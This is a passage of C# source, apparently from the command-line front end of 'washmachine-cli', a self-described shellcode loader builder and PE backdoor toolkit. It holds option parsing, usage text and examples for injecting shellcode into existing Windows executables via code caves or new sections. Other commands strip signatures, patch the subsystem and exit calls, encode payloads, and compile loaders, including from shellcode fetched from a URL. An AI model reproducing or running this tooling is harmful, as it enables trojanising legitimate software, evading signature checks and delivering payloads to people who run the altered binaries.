                    ? "PE has digital signature (will be removed)"
                    : "No digital signature");

                // Injection plan
                AnsiConsole.WriteLine();
                AnsiConsole.Write(new Rule("[bold cyan1]Injection Plan[/]").RuleStyle(Style.Parse("grey42")).LeftJustified());

                var planTable = new Table()
                    .Border(TableBorder.Rounded)
                    .BorderColor(Color.Grey42)
                    .HideHeaders()
                    .AddColumn("Property")
                    .AddColumn("Value");

                planTable.AddRow("[cyan1]Method[/]", $"[white]{injectionMethod}[/]");
                planTable.AddRow("[cyan1]Encryption[/]", $"[white]{encryptionMethod}{(encryptionMethod == PayloadEncryption.Xor ? $" (key=0x{xorKey:X2})" : "")}[/]");
                planTable.AddRow("[cyan1]Invoke[/]", $"[white]{carrierInvoke}[/]");
                planTable.AddRow("[cyan1]Remove sig[/]", $"[white]{removeSig}[/]");
                planTable.AddRow("[cyan1]Patch GUI[/]", $"[white]{patchSubsystem}[/]");

                AnsiConsole.Write(planTable);
                AnsiConsole.WriteLine();
            }

            if (dryRun)
            {
                if (!jsonOutput)
                {
                    AnsiConsole.Write(new Panel("[green3_1]Dry run \u2014 no injection performed.[/]")
                        .BorderColor(Color.Green)
                        .Border(BoxBorder.Rounded));
                }
                return 0;
            }

            // ── Inject ───────────────────────────────────────────────
            var options = new PeBackdoorOptions
            {
                TargetPePath = peFile,
                ShellcodePath = shellcodeFile,
                OutputPath = outputFile ?? Path.Combine(
                    Path.GetDirectoryName(peFile) ?? ".",
                    Path.GetFileNameWithoutExtension(peFile) + ".backdoored" + Path.GetExtension(peFile)),
                Method = injectionMethod,
                Encryption = encryptionMethod,
                CarrierInvoke = carrierInvoke,
                XorKey = xorKey,
                NewSectionName = sectionName,
                RemoveSignature = removeSig,
                PatchSubsystemToGui = patchSubsystem,
                PreserveOriginalEntry = preserveEntry,
                PatchIat = patchIat,
                PatchExitCalls = patchExitCalls,
                MinCaveSize = minCaveSize,
            };

            var result = jsonOutput
                ? await service.BackdoorAsync(options)
                : await AnsiConsole.Status()
                    .Spinner(Spinner.Known.Dots)
                    .SpinnerStyle(Style.Parse("cyan1"))
                    .StartAsync("Injecting payload...", async _ => await service.BackdoorAsync(options));

            if (jsonOutput)
            {
                var output = new
                {
                    result.Success,
                    result.OutputPath,
                    result.ErrorMessage,
                    result.ShellcodeAddress,
                    result.CarrierAddress,
                    result.ShellcodeSize,
                    result.CarrierSize,
                    result.Warnings,
                    result.Steps,
                };
                Console.WriteLine(System.Text.Json.JsonSerializer.Serialize(output, JsonPrint));
            }
            else
            {
                foreach (var step in result.Steps)
                    AnsiConsole.MarkupLine($"    [green3_1]\u2713[/] {Markup.Escape(step)}");

                foreach (var warn in result.Warnings)
                    AnsiConsole.MarkupLine($"    [yellow]\u26A0[/] {Markup.Escape(warn)}");

                AnsiConsole.WriteLine();
                if (result.Success)
                {
                    AnsiConsole.Write(new Panel(
                        $"[green3_1]SUCCESS: Backdoored PE written to {Markup.Escape(result.OutputPath ?? "unknown")}[/]\n" +
                        $"[grey]Output size: {new FileInfo(result.OutputPath!).Length:N0} bytes[/]")
                        .BorderColor(Color.Green)
                        .Border(BoxBorder.Rounded));
                }
                else
                {
                    AnsiConsole.Write(new Panel($"[red]FAILED: {Markup.Escape(result.ErrorMessage ?? "unknown")}[/]")
                        .BorderColor(Color.Red)
                        .Border(BoxBorder.Rounded));
                    return 1;
                }
            }

            return result.Success ? 0 : 1;
        }
        catch (Exception ex)
        {
            if (jsonOutput)
            {
                Console.WriteLine(System.Text.Json.JsonSerializer.Serialize(new { Success = false, Error = ex.Message }, JsonPrint));
            }
            else
            {
                logger.Error($"Backdoor failed: {ex.Message}");
                if (verbose) logger.Error(ex.StackTrace ?? "");
            }
            return 1;
        }
    }

    private static void PrintCheck(bool ok, string message)
    {
        var icon = ok ? "[green3_1]\u2713[/]" : "[red]\u2717[/]";
        AnsiConsole.MarkupLine($"    {icon} {Markup.Escape(message)}");
    }

    private static int PrintBackdoorUsage()
    {
        AnsiConsole.WriteLine();
        AnsiConsole.MarkupLine("[dim]Usage:[/] washmachine-cli backdoor [darkorange]--pe <file>[/] [darkorange]--shellcode <file>[/] [grey][[options]][/]");
        AnsiConsole.WriteLine();

        AnsiConsole.Write(new Rule("[cyan1]Required[/]").RuleStyle(Style.Parse("grey42")).LeftJustified());

        var reqTable = new Table()
            .Border(TableBorder.None)
            .HideHeaders()
            .AddColumn("Option")
            .AddColumn("Description");

        reqTable.AddRow("[darkorange]--pe <file>[/]", "Target PE file to backdoor");
        reqTable.AddRow("[darkorange]--shellcode, -s <file>[/]", "Shellcode .bin file to inject");

        AnsiConsole.Write(reqTable);
        AnsiConsole.WriteLine();

        AnsiConsole.Write(new Rule("[cyan1]Options[/]").RuleStyle(Style.Parse("grey42")).LeftJustified());

        var optTable = new Table()
            .Border(TableBorder.None)
            .HideHeaders()
            .AddColumn("Option")
            .AddColumn("Description");

        optTable.AddRow("[darkorange]--output, -o <file>[/]", "Output file (default: <input>.backdoored.exe)");
        optTable.AddRow("[darkorange]--method, -m <method>[/]", "code-cave | new-section | section-ext");
        optTable.AddRow("[darkorange]--encryption <enc>[/]", "Reserved. Backdoor expects a ready-to-inject flat .bin payload");
        optTable.AddRow("[darkorange]--xor-key <byte>[/]", "XOR key as hex (e.g., 0x42) or decimal");
        optTable.AddRow("[darkorange]--carrier <invoke>[/]", "entry-point only (other carrier modes are not implemented)");
        optTable.AddRow("[darkorange]--section-name <name>[/]", "Name for new section (default: .extra)");
        optTable.AddRow("[darkorange]--no-remove-sig[/]", "Don't remove PE digital signature");
        optTable.AddRow("[darkorange]--no-patch-subsystem[/]", "Don't patch subsystem to GUI");
        optTable.AddRow("[darkorange]--no-preserve-entry[/]", "Reserved. Disabling OEP resume is not implemented");
        optTable.AddRow("[darkorange]--no-patch-iat[/]", "Reserved. IAT auto-patching is not currently implemented");
        optTable.AddRow("[darkorange]--no-patch-exit[/]", "Don't patch exit calls (ExitProcess→ExitThread)");
        optTable.AddRow("[darkorange]--cave-min-size <n>[/]", "Minimum code cave size in bytes");
        optTable.AddRow("[darkorange]--dry-run[/]", "Analyze and report without injecting");
        optTable.AddRow("[darkorange]--verbose[/]", "Show detailed logging");
        optTable.AddRow("[darkorange]--json[/]", "Output results as JSON");

        AnsiConsole.Write(optTable);
        AnsiConsole.WriteLine();

        AnsiConsole.Write(new Rule("[cyan1]Notes[/]").RuleStyle(Style.Parse("grey42")).LeftJustified());
        AnsiConsole.MarkupLine("  [grey]Backdoor injects a ready-to-run flat .bin payload.[/]");
        AnsiConsole.MarkupLine("  [grey]In-place backdoor encryption and non-entry-point carriers are not supported.[/]");
        AnsiConsole.WriteLine();

        AnsiConsole.Write(new Rule("[cyan1]Examples[/]").RuleStyle(Style.Parse("grey42")).LeftJustified());
        AnsiConsole.MarkupLine("  [grey]washmachine-cli backdoor --pe app.exe -s calc.bin[/]");
        AnsiConsole.MarkupLine("  [grey]washmachine-cli backdoor --pe app.exe -s payload.bin -m new-section[/]");
        AnsiConsole.MarkupLine("  [grey]washmachine-cli backdoor --pe app.exe -s shell.bin --dry-run --verbose[/]");
        return 0;
    }

    // ═══════════════════════════════════════════════════════════════════════
    //  strip
    // ═══════════════════════════════════════════════════════════════════════

    private static async Task<int> RunStripAsync(string[] args)
    {
        if (args.Length == 0)
            return await RunSubMode("strip", RunStripAsync, PrintStripUsage);

        if (args[0] is "--help" or "-h")
        {
            PrintStripUsage();
            return 0;
        }

        string peFile = args[0];
        string? outputFile = null;
        string? sectionName = null;
        bool analyze = false;
        bool noTrim = false;
        var mode = StripMode.EntryPointToEnd;
        uint rangeStart = 0, rangeLen = 0;

        for (int i = 1; i < args.Length; i++)
        {
            switch (args[i])
            {
                case "-o" or "--output":
                    if (++i < args.Length) outputFile = args[i];
                    break;
                case "--mode" or "-m":
                    if (++i < args.Length)
                    {
                        mode = args[i].ToLowerInvariant() switch
                        {
                            "ep" or "entry-point" => StripMode.EntryPointToEnd,
                            "section"             => StripMode.Section,
                            "all-exec"            => StripMode.AllExecutable,
                            "range"               => StripMode.RawRange,
                            _ => mode,
                        };
                    }
                    break;
                case "--section":
                    if (++i < args.Length) sectionName = args[i];
                    break;
                case "--analyze":
                    analyze = true;
                    break;
                case "--no-trim":
                    noTrim = true;
                    break;
                case "--range":
                    if (++i < args.Length)
                    {
                        var parts = args[i].Split(':');
                        if (parts.Length == 2)
                        {
                            rangeStart = Convert.ToUInt32(parts[0], parts[0].StartsWith("0x", StringComparison.OrdinalIgnoreCase) ? 16 : 10);
                            rangeLen = Convert.ToUInt32(parts[1], parts[1].StartsWith("0x", StringComparison.OrdinalIgnoreCase) ? 16 : 10);
                        }
                    }
                    break;
            }
        }

        if (!File.Exists(peFile))
        {
            AnsiConsole.MarkupLine($"[red]File not found:[/] [white]{Markup.Escape(peFile)}[/]");
            return 1;
        }

        var logger = new ConsoleLogger();
        var stripper = new PeStripService(logger);

        if (analyze)
        {
            var analysis = await stripper.AnalyzeAsync(peFile);

            AnsiConsole.Write(new Panel($"[bold cyan1]PE Strip Analysis[/]  [grey]{Markup.Escape(peFile)}[/]")
                .BorderColor(Color.Cyan1)
                .Border(BoxBorder.Rounded));
            AnsiConsole.WriteLine();

            AnsiConsole.MarkupLine($"  [cyan1]Architecture:[/]  [white]{(analysis.Is64Bit ? "x64" : "x86")}[/]");
            AnsiConsole.MarkupLine($"  [cyan1]Entry Point:[/]   [mediumpurple1]0x{analysis.EntryPoint:X8}[/]");
            AnsiConsole.MarkupLine($"  [cyan1]EP Section:[/]    [white]{Markup.Escape(analysis.EntryPointSection ?? "unknown")}[/]");
            AnsiConsole.WriteLine();

            var table = new Table()
                .Border(TableBorder.Rounded)
                .BorderColor(Color.Grey42)
                .AddColumn(new TableColumn("[cyan1]Section[/]").LeftAligned())
                .AddColumn(new TableColumn("[cyan1]RawAddr[/]").RightAligned())
                .AddColumn(new TableColumn("[cyan1]RawSize[/]").RightAligned())
                .AddColumn(new TableColumn("[cyan1]Perms[/]").Centered())
                .AddColumn(new TableColumn("[cyan1]EP[/]").Centered());

            foreach (var sec in analysis.Sections)
            {
                string perms = (sec.IsReadable ? "R" : "-") + (sec.IsWritable ? "W" : "-") + (sec.IsExecutable ? "X" : "-");
                table.AddRow(
                    Markup.Escape(sec.Name),
                    $"[mediumpurple1]0x{sec.RawAddress:X8}[/]",
                    $"[mediumpurple1]0x{sec.RawSize:X8}[/]",
                    $"[white]{perms}[/]",
                    sec.ContainsEntryPoint ? "[green3_1]<<<[/]" : ""
                );
            }

            AnsiConsole.Write(table);
            return 0;
        }

        outputFile ??= Path.Combine(
            Path.GetDirectoryName(peFile) ?? ".",
            Path.GetFileNameWithoutExtension(peFile) + ".bin");

        var options = new StripOptions
        {
            InputPath = peFile,
            OutputPath = outputFile,
            Mode = mode,
            SectionName = sectionName,
            TrimTrailingZeros = !noTrim,
            RawOffset = rangeStart,
            RawLength = (int)rangeLen,
        };

        try
        {
            var result = await AnsiConsole.Status()
                .Spinner(Spinner.Known.Dots)
                .SpinnerStyle(Style.Parse("cyan"))
                .StartAsync("Stripping PE...", async _ => await stripper.StripAsync(options));

            foreach (var w in result.Warnings)
                AnsiConsole.MarkupLine($"    [yellow]\u26A0[/] {Markup.Escape(w)}");

            if (result.Success)
            {
                AnsiConsole.Write(new Panel(
                    $"[green3_1]Extracted {result.ExtractedSize:N0} bytes to {Markup.Escape(result.OutputPath ?? "unknown")}[/]\n" +
                    $"[grey]Original: {result.OriginalSize:N0} bytes | Trimmed: {result.TrimmedBytes:N0} bytes[/]")
                    .BorderColor(Color.Green)
                    .Border(BoxBorder.Rounded));
            }
            else
            {
                AnsiConsole.Write(new Panel($"[red]{Markup.Escape(result.Error ?? "Unknown error")}[/]")
                    .BorderColor(Color.Red)
                    .Border(BoxBorder.Rounded));
                return 1;
            }

            return 0;
        }
        catch (Exception ex)
        {
            AnsiConsole.MarkupLine($"[red]Strip failed:[/] [white]{Markup.Escape(ex.Message)}[/]");
            return 1;
        }
    }

    private static int PrintStripUsage()
    {
        AnsiConsole.MarkupLine("[dim]Usage:[/] washmachine-cli strip [darkorange]<pe-file>[/] [grey][[options]][/]");
        AnsiConsole.WriteLine();

        AnsiConsole.Write(new Rule("[cyan1]Options[/]").RuleStyle(Style.Parse("grey42")).LeftJustified());

        var optTable = new Table()
            .Border(TableBorder.None)
            .HideHeaders()
            .AddColumn("Option")
            .AddColumn("Description");

        optTable.AddRow("[darkorange]-o, --output <file>[/]", "Output .bin path (default: <input>.bin)");
        optTable.AddRow("[darkorange]-m, --mode <mode>[/]", "ep | section | all-exec | range");
        optTable.AddRow("[darkorange]--section <name>[/]", "Section name (for 'section' mode)");
        optTable.AddRow("[darkorange]--range <start:len>[/]", "Raw file range (for 'range' mode, hex ok)");
        optTable.AddRow("[darkorange]--no-trim[/]", "Don't trim trailing zeros");
        optTable.AddRow("[darkorange]--analyze[/]", "Show section layout without extracting");

        AnsiConsole.Write(optTable);
        AnsiConsole.WriteLine();

        AnsiConsole.Write(new Rule("[cyan1]Pipeline[/]").RuleStyle(Style.Parse("grey42")).LeftJustified());
        AnsiConsole.MarkupLine("  [dim]1.[/] [cyan1]strip[/] extracts a flat binary from an existing PE.");
        AnsiConsole.MarkupLine("  [dim]2.[/] Validate that the extracted [white].bin[/] is actually compatible with PE backdooring.");
        AnsiConsole.MarkupLine("  [dim]3.[/] Use [cyan1]backdoor[/] only with a ready-to-run flat payload.");
        return 0;
    }

    // ═══════════════════════════════════════════════════════════════════════
    //  list
    // ═══════════════════════════════════════════════════════════════════════

    private static async Task<int> RunListAsync(string[] args)
    {
        var logger = new ConsoleLogger();
        var paths = new AppPaths();

        if (args.Length == 0)
            return await RunSubMode("list", RunListAsync, PrintListUsage);

        var what = args[0].TrimStart('-').ToLowerInvariant();

        switch (what)
        {
            case "templates":
            {
                var catalog = new YamlCodeSnippetCatalogService(paths);
                var templates = catalog.GetTemplates();

                var table = new Table()
                    .Border(TableBorder.Rounded)
                    .BorderColor(Color.Grey42)
                    .Title($"[bold cyan1]Templates[/] [grey]({templates.Count})[/]")
                    .AddColumn(new TableColumn("[cyan1]ID[/]").LeftAligned())
                    .AddColumn(new TableColumn("[cyan1]Display[/]").LeftAligned());

                foreach (var t in templates)
                    table.AddRow($"[cyan1]{Markup.Escape(t.Id)}[/]", Markup.Escape(t.Display));

                AnsiConsole.Write(table);
                break;
            }
            case "encoders":
            {
                var runner = new Bin2ShellRunner(paths);
                var encodingCatalog = new ShellcodeEncodingCatalogService(runner, paths);

                ShellcodeEncodingCatalog catalog;
                try
                {
                    catalog = await encodingCatalog.GetCatalogAsync();
                }
                catch (Exception ex)
                {
                    AnsiConsole.MarkupLine("[gold1]⚠ Bin2Shell is not available.[/]");
                    AnsiConsole.MarkupLine($"[grey]  {Markup.Escape(ex.Message)}[/]");
                    AnsiConsole.WriteLine();
                    AnsiConsole.MarkupLine("[dim]Run [cyan1]washmachine-cli provision[/] to download Bin2Shell, then try again.[/]");
                    break;
                }

                var encTable = new Table()
                    .Border(TableBorder.Rounded)
                    .BorderColor(Color.Grey42)
                    .Title($"[bold cyan1]Encoders[/] [grey]({catalog.Encoders.Count})[/]")
                    .AddColumn("[cyan1]Index[/]")
                    .AddColumn("[cyan1]Name[/]")
                    .AddColumn("[cyan1]Description[/]");

                foreach (var e in catalog.Encoders)
                    encTable.AddRow($"[mediumpurple1]{e.Index}[/]", $"[white]{Markup.Escape(e.Name)}[/]", $"[grey]{Markup.Escape(e.Description)}[/]");

                AnsiConsole.Write(encTable);
                AnsiConsole.WriteLine();

                var envTable = new Table()
                    .Border(TableBorder.Rounded)
                    .BorderColor(Color.Grey42)
                    .Title($"[bold cyan1]Envelopes[/] [grey]({catalog.Envelopes.Count})[/]")
                    .AddColumn("[cyan1]Index[/]")
                    .AddColumn("[cyan1]Name[/]")
                    .AddColumn("[cyan1]Description[/]");

                foreach (var e in catalog.Envelopes)
                    envTable.AddRow($"[mediumpurple1]{e.Index}[/]", $"[white]{Markup.Escape(e.Name)}[/]", $"[grey]{Markup.Escape(e.Description)}[/]");

                AnsiConsole.Write(envTable);
                break;
            }
            case "snippets":
            {
                var catalog = new YamlCodeSnippetCatalogService(paths);
                var sections = catalog.GetAllSections();

                var tree = new Tree($"[bold cyan1]Snippet Catalog[/] [grey]({sections.Count} sections)[/]");

                foreach (var s in sections)
                {
                    var node = tree.AddNode($"[bold darkorange]{Markup.Escape(s.Header)}[/] [grey]({s.Items.Count} items)[/]");
                    foreach (var item in s.Items)
                    {
                        var label = item.IsDefault
                            ? $"[green3_1]{Markup.Escape(item.Id)}[/] \u2014 {Markup.Escape(item.Display)} [green3_1]\u2605 default[/]"
                            : $"[white]{Markup.Escape(item.Id)}[/] \u2014 [grey]{Markup.Escape(item.Display)}[/]";
                        node.AddNode(label);
                    }
                }

                AnsiConsole.Write(tree);
                break;
            }
            case "compilers":
            {
                var toolLocator = new CompilerToolLocator(logger);
                var result = await toolLocator.DiscoverAsync();

                if (result.Best != null)
                {
                    AnsiConsole.Write(new Panel($"[green3_1]Best compiler:[/] [grey]{Markup.Escape(result.Best.Path)}[/] [dim]({Markup.Escape($"{result.Best.Kind}")})[/]")
                        .BorderColor(Color.Green)
                        .Border(BoxBorder.Rounded));
                    AnsiConsole.WriteLine();
                }

                var table = new Table()
                    .Border(TableBorder.Rounded)
                    .BorderColor(Color.Grey42)
                    .Title($"[bold cyan1]Candidates[/] [grey]({result.Candidates.Count})[/]")
                    .AddColumn(new TableColumn("[cyan1]Kind[/]").LeftAligned())
                    .AddColumn(new TableColumn("[cyan1]Path[/]").LeftAligned());

                foreach (var c in result.Candidates)
                    table.AddRow($"[cyan1]{Markup.Escape($"{c.Kind}")}[/]", $"[grey]{Markup.Escape(c.Path)}[/]");

                AnsiConsole.Write(table);

                if (result.Errors.Count > 0)
                {
                    AnsiConsole.WriteLine();
                    AnsiConsole.MarkupLine("[gold1]Errors:[/]");
                    foreach (var e in result.Errors)
                        AnsiConsole.MarkupLine($"  [red]{Markup.Escape(e)}[/]");
                }
                break;
            }
            default:
                AnsiConsole.MarkupLine($"[red]Error:[/] Unknown list target: {Markup.Escape(what)}. Use templates, encoders, snippets, or compilers.");
                return 1;
        }

        return 0;
    }

    // ═══════════════════════════════════════════════════════════════════════
    //  provision
    // ═══════════════════════════════════════════════════════════════════════

    private static async Task<int> RunProvisionAsync(string[] args)
    {
        var logger = new ConsoleLogger();
        var paths = new AppPaths();
        var provisioner = new RequirementProvisioner(paths, logger);

        try
        {
            await AnsiConsole.Progress()
                .AutoClear(false)
                .HideCompleted(false)
                .Columns(new ProgressColumn[]
                {
                    new TaskDescriptionColumn(),
                    new ProgressBarColumn(),
                    new PercentageColumn(),
                    new SpinnerColumn(),
                })
                .StartAsync(async ctx =>
                {
                    var task = ctx.AddTask("Provisioning...");
                    task.IsIndeterminate = true;
                    var reporter = new SpectreProgressReporter(task);
                    await provisioner.EnsureRequirementsAsync(reporter);
                });

            return 0;
        }
        catch (Exception ex)
        {
            logger.Error($"Provisioning failed: {ex.Message}");
            return 1;
        }
    }

    private static int PrintCompileUsage()
    {
        AnsiConsole.WriteLine();
        AnsiConsole.MarkupLine("[dim]Usage:[/] washmachine-cli compile [darkorange]--shellcode <file>[/] [grey][[options]][/]");
        AnsiConsole.WriteLine();

        AnsiConsole.Write(new Rule("[cyan1]Required (one of)[/]").RuleStyle(Style.Parse("grey42")).LeftJustified());
        AnsiConsole.WriteLine();

        var reqTable = new Table()
            .Border(TableBorder.None)
            .HideHeaders()
            .AddColumn("Option")
            .AddColumn("Description");

        reqTable.AddRow("[darkorange]--shellcode, -s <file>[/]", "Path to shellcode .bin file");
        reqTable.AddRow("[darkorange]--shellcode-hex <hex>[/]", "Hex-encoded shellcode string");
        reqTable.AddRow("[darkorange]--shellcode-url, -u <url>[/]", "URL to fetch shellcode from");

        AnsiConsole.Write(reqTable);
        AnsiConsole.WriteLine();

        AnsiConsole.Write(new Rule("[cyan1]Options[/]").RuleStyle(Style.Parse("grey42")).LeftJustified());
        AnsiConsole.WriteLine();

        var optTable = new Table()
            .Border(TableBorder.None)
            .HideHeaders()
            .AddColumn("Option")
            .AddColumn("Description");

        optTable.AddRow("[darkorange]--template, -t <id>[/]", "Template ID (default: shellcode-minimal)");
        optTable.AddRow("[darkorange]--encoder, -e <index>[/]", "Bin2Shell encoder index (default: 0 = none)");
        optTable.AddRow("[darkorange]--envelope, -v <index>[/]", "Bin2Shell envelope index (default: 0 = none)");
        optTable.AddRow("[darkorange]--snippet <key=value>[/]", "Snippet selection (repeatable)");
        optTable.AddRow("[darkorange]--verbose[/]", "Enable verbose logging");
        optTable.AddRow("[darkorange]--json[/]", "Output results as JSON");

        AnsiConsole.Write(optTable);
        AnsiConsole.WriteLine();

        AnsiConsole.Write(new Rule("[cyan1]Examples[/]").RuleStyle(Style.Parse("grey42")).LeftJustified());
        AnsiConsole.WriteLine();
        AnsiConsole.MarkupLine("  [grey]washmachine-cli compile -s payload.bin[/]");
        AnsiConsole.MarkupLine("  [grey]washmachine-cli compile -s payload.bin -t shellcode-minimal[/]");
        AnsiConsole.MarkupLine("  [grey]washmachine-cli compile --shellcode-hex FC4883E4F0... -e 1[/]");
        AnsiConsole.MarkupLine("  [grey]washmachine-cli compile -u http://host/shell.bin --verbose[/]");

        return 0;
    }

    private static int PrintAnalyzeUsage()
    {
        AnsiConsole.WriteLine();
        AnsiConsole.MarkupLine("[dim]Usage:[/] washmachine-cli analyze [darkorange]<pe-file>[/] [grey][[options]][/]");
        AnsiConsole.WriteLine();

        AnsiConsole.Write(new Rule("[cyan1]Required[/]").RuleStyle(Style.Parse("grey42")).LeftJustified());
        AnsiConsole.WriteLine();

        var reqTable = new Table()
            .Border(TableBorder.None)
            .HideHeaders()
            .AddColumn("Option")
            .AddColumn("Description");

        reqTable.AddRow("[darkorange]<pe-file>[/]", "Path to the PE file to analyze");

        AnsiConsole.Write(reqTable);
        AnsiConsole.WriteLine();

        AnsiConsole.Write(new Rule("[cyan1]Options[/]").RuleStyle(Style.Parse("grey42")).LeftJustified());
        AnsiConsole.WriteLine();

        var optTable = new Table()
            .Border(TableBorder.None)
            .HideHeaders()
            .AddColumn("Option")
            .AddColumn("Description");

        optTable.AddRow("[darkorange]--json[/]", "Output results as JSON");

        AnsiConsole.Write(optTable);
        AnsiConsole.WriteLine();

        AnsiConsole.Write(new Rule("[cyan1]Examples[/]").RuleStyle(Style.Parse("grey42")).LeftJustified());
        AnsiConsole.WriteLine();
        AnsiConsole.MarkupLine("  [grey]washmachine-cli analyze target.exe[/]");
        AnsiConsole.MarkupLine("  [grey]washmachine-cli analyze malware.dll --json[/]");

        return 0;
    }

    private static int PrintListUsage()
    {
        AnsiConsole.WriteLine();
        AnsiConsole.MarkupLine("[dim]Usage:[/] washmachine-cli list [darkorange]<target>[/]");
        AnsiConsole.WriteLine();

        AnsiConsole.Write(new Rule("[cyan1]Targets[/]").RuleStyle(Style.Parse("grey42")).LeftJustified());
        AnsiConsole.WriteLine();

        var optTable = new Table()
            .Border(TableBorder.None)
            .HideHeaders()
            .AddColumn("Option")
            .AddColumn("Description");

        optTable.AddRow("[darkorange]--templates[/]", "List available code templates");
        optTable.AddRow("[darkorange]--encoders[/]", "List available encoders and envelopes");
        optTable.AddRow("[darkorange]--snippets[/]", "List available snippet sections and items");
        optTable.AddRow("[darkorange]--compilers[/]", "List discovered compiler toolchains");

        AnsiConsole.Write(optTable);
        AnsiConsole.WriteLine();

        AnsiConsole.Write(new Rule("[cyan1]Examples[/]").RuleStyle(Style.Parse("grey42")).LeftJustified());
        AnsiConsole.WriteLine();
        AnsiConsole.MarkupLine("  [grey]washmachine-cli list --templates[/]");
        AnsiConsole.MarkupLine("  [grey]washmachine-cli list --encoders[/]");
        AnsiConsole.MarkupLine("  [grey]washmachine-cli list --snippets[/]");
        AnsiConsole.MarkupLine("  [grey]washmachine-cli list --compilers[/]");

        return 0;
    }

    private static int PrintProvisionUsage()
    {
        AnsiConsole.WriteLine();
        AnsiConsole.MarkupLine("[dim]Usage:[/] washmachine-cli provision");
        AnsiConsole.WriteLine();
        AnsiConsole.MarkupLine("[dim]Downloads and installs required external tools (Bin2Shell).[/]");
        AnsiConsole.MarkupLine("[dim]This command takes no additional options.[/]");
        AnsiConsole.WriteLine();

        AnsiConsole.Write(new Rule("[cyan1]Example[/]").RuleStyle(Style.Parse("grey42")).LeftJustified());
        AnsiConsole.WriteLine();
        AnsiConsole.MarkupLine("  [grey]washmachine-cli provision[/]");

        return 0;
    }

    private static int PrintTestUsage()
    {
        AnsiConsole.WriteLine();
        AnsiConsole.MarkupLine("[dim]Usage:[/] washmachine-cli test [grey][[options]][/]");
        AnsiConsole.WriteLine();
        AnsiConsole.MarkupLine("[dim]Runs the automated test harness against the toolkit.[/]");
        AnsiConsole.WriteLine();

        AnsiConsole.Write(new Rule("[cyan1]Example[/]").RuleStyle(Style.Parse("grey42")).LeftJustified());
        AnsiConsole.WriteLine();
        AnsiConsole.MarkupLine("  [grey]washmachine-cli test[/]");

        return 0;
    }

    // ═══════════════════════════════════════════════════════════════════════
    //  help
    // ═══════════════════════════════════════════════════════════════════════

    private static int PrintUsage()
    {
        AnsiConsole.WriteLine();
        AnsiConsole.MarkupLine("[white]Shellcode loader builder & PE backdoor toolkit[/]");
        AnsiConsole.WriteLine();
        AnsiConsole.MarkupLine("[dim]Usage:[/] washmachine-cli [cyan1]<command>[/] [grey][[options]][/]");
        AnsiConsole.WriteLine();

        var commandTable = new Table()
            .Border(TableBorder.Rounded)
            .BorderColor(Color.Grey42)
            .AddColumn(new TableColumn("[cyan1]Command[/]"))
            .AddColumn(new TableColumn("[white]Description[/]"));

        commandTable.AddRow("[cyan1]compile[/]", "Build a shellcode loader executable");
        commandTable.AddRow("[cyan1]analyze[/]", "Analyze a PE file (headers, sections, imports, code caves)");
        commandTable.AddRow("[cyan1]backdoor[/]", "Inject shellcode into an existing PE file");
        commandTable.AddRow("[cyan1]strip[/]", "Extract flat binary (.bin) from a PE file");
        commandTable.AddRow("[cyan1]list[/]", "List available templates, encoders, snippets, or compilers");
        commandTable.AddRow("[cyan1]provision[/]", "Download and install required external tools (Bin2Shell)");
        commandTable.AddRow("[cyan1]test[/]", "Run the automated test harness");

        AnsiConsole.Write(new Panel(commandTable)
            .Header("[bold cyan1]washmachine-cli[/]")
            .Border(BoxBorder.Rounded)
            .BorderColor(Color.Cyan1));

        AnsiConsole.WriteLine();

        // Pipeline
        AnsiConsole.Write(new Rule("[cyan1]Pipeline[/]").RuleStyle(Style.Parse("grey42")).LeftJustified());
        AnsiConsole.WriteLine();
        AnsiConsole.MarkupLine("  [dim]1.[/] [cyan1]compile[/]   shellcode.bin  [dim]-->[/]  loader.exe");
        AnsiConsole.MarkupLine("  [dim]2.[/] [cyan1]strip[/]     loader.exe     [dim]-->[/]  loader.bin");
        AnsiConsole.MarkupLine("  [dim]3.[/] [cyan1]backdoor[/]  loader.bin + target.exe  [dim]-->[/]  backdoored.exe");

        AnsiConsole.WriteLine();

        // Examples
        AnsiConsole.Write(new Rule("[cyan1]Quick Examples[/]").RuleStyle(Style.Parse("grey42")).LeftJustified());
        AnsiConsole.WriteLine();
        AnsiConsole.MarkupLine("  [grey]washmachine-cli compile -s payload.bin -t shellcode-minimal[/]");
        AnsiConsole.MarkupLine("  [grey]washmachine-cli backdoor --pe app.exe -s loader.bin[/]");
        AnsiConsole.MarkupLine("  [grey]washmachine-cli analyze target.exe[/]");

        AnsiConsole.WriteLine();
        AnsiConsole.MarkupLine("[dim]Run[/] [cyan1]help <command>[/] [dim]for detailed options and examples.[/]");

        return 0;
    }

    private static int PrintUnknownCommand(string command)
    {
        var validCommands = new[] { "compile", "analyze", "backdoor", "strip", "list", "provision", "test", "help" };

        AnsiConsole.WriteLine();
        AnsiConsole.MarkupLine($"[red1]Unknown command:[/] [white]{Markup.Escape(command)}[/]");
        AnsiConsole.WriteLine();

        // Suggest similar commands using simple substring/distance matching
        var suggestions = validCommands
            .Where(c => c.Contains(command, StringComparison.OrdinalIgnoreCase)
                     || command.Contains(c, StringComparison.OrdinalIgnoreCase)
                     || LevenshteinDistance(c, command) <= 3)
            .ToArray();

        if (suggestions.Length > 0)
        {
            AnsiConsole.MarkupLine("[dim]Did you mean:[/]");
            foreach (var s in suggestions)
                AnsiConsole.MarkupLine($"  [cyan1]{s}[/]");
            AnsiConsole.WriteLine();
        }

        AnsiConsole.MarkupLine("[dim]Available commands:[/]");
        foreach (var c in validCommands.Where(c => c != "help"))
            AnsiConsole.MarkupLine($"  [cyan1]{c}[/]");

        AnsiConsole.WriteLine();
        AnsiConsole.MarkupLine("[dim]Run[/] [cyan1]help[/] [dim]for usage information.[/]");
        return 1;
    }

    private static int LevenshteinDistance(string s, string t)
    {
        int n = s.Length, m = t.Length;
        var d = new int[n + 1, m + 1];
        for (int i = 0; i <= n; i++) d[i, 0] = i;
        for (int j = 0; j <= m; j++) d[0, j] = j;
        for (int i = 1; i <= n; i++)
            for (int j = 1; j <= m; j++)
                d[i, j] = Math.Min(Math.Min(d[i - 1, j] + 1, d[i, j - 1] + 1),
                    d[i - 1, j - 1] + (s[i - 1] == t[j - 1] ? 0 : 1));
        return d[n, m];
    }

    // ═══════════════════════════════════════════════════════════════════════
    //  Spectre.Console progress reporter
    // ═══════════════════════════════════════════════════════════════════════

    private sealed class SpectreProgressReporter : IProgressReporter
    {
        private readonly ProgressTask _task;

        public SpectreProgressReporter(ProgressTask task)
        {
            _task = task;
        }

        public void UpdateStatus(string message, int percentComplete)
        {
            _task.Description = message;
            if (percentComplete >= 0)
            {
                _task.IsIndeterminate = false;
                _task.Value = percentComplete;
            }
            else
            {
